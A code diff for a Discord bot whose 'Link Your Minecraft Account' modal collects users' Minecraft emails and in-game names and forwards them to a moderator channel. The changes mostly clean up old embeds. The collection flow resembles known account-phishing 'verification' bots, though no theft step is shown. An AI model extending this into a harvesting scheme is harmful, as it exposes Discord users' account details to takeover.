@@ -14,14 +14,11 @@ intents.dm_messages = True
 
 bot = commands.Bot(command_prefix='!', intents=intents)
 
-pending_codes = {}  # user_id: initiator_id
-
 class VerifyModal(discord.ui.Modal, title="Link Your Minecraft Account"):
     email = discord.ui.TextInput(label="Minecraft Email", placeholder="example@gmail.com", required=True)
     ign = discord.ui.TextInput(label="Minecraft IGN", placeholder="YourInGameName", required=True)
 
     async def on_submit(self, interaction: discord.Interaction):
-        # Send verification info to mod channel
         log_channel = await bot.fetch_channel(MOD_CHANNEL_ID)
 
         embed = discord.Embed(
@@ -31,6 +28,7 @@ class VerifyModal(discord.ui.Modal, title="Link Your Minecraft Account"):
         embed.add_field(name="User", value=interaction.user.mention, inline=False)
         embed.add_field(name="Email", value=self.email.value, inline=False)
         embed.add_field(name="IGN", value=self.ign.value, inline=False)
+
         embed.set_footer(text="This is an automated message.")
 
         await log_channel.send(embed=embed)
@@ -54,8 +52,16 @@ async def on_ready():
     except Exception as e:
         print(f"Error syncing commands: {e}")
 
-    # Auto-send embed to verification channel
     verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)
+
+    # Delete old embeds
+    async for message in verification_channel.history(limit=50):
+        if message.author == bot.user and message.embeds:
+            embed = message.embeds[0]
+            if embed.title == "🔗 Link Your Minecraft Account":
+                await message.delete()
+
+    # Send fresh embed
     embed = discord.Embed(
         title="🔗 Link Your Minecraft Account",
         description="Click the **Link Account** button below to start verification.",
@@ -66,12 +72,21 @@ async def on_ready():
 
 @bot.tree.command(name="setup", description="Start the Minecraft account verification process")
 async def setup(interaction: discord.Interaction):
+    verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)
+
+    # Delete old embeds
+    async for message in verification_channel.history(limit=50):
+        if message.author == bot.user and message.embeds:
+            embed = message.embeds[0]
+            if embed.title == "🔗 Link Your Minecraft Account":
+                await message.delete()
+
     embed = discord.Embed(
         title="🔗 Link Your Minecraft Account",
         description="Click the **Link Account** button below to start verification.",
         color=discord.Color.green()
     )
     embed.set_footer(text="This is an automated message.")
-    await interaction.response.send_message(embed=embed, view=LinkView())
+    await interaction.response.send_message(embed=embed, view=LinkView(), ephemeral=True)
 
 bot.run(TOKEN)
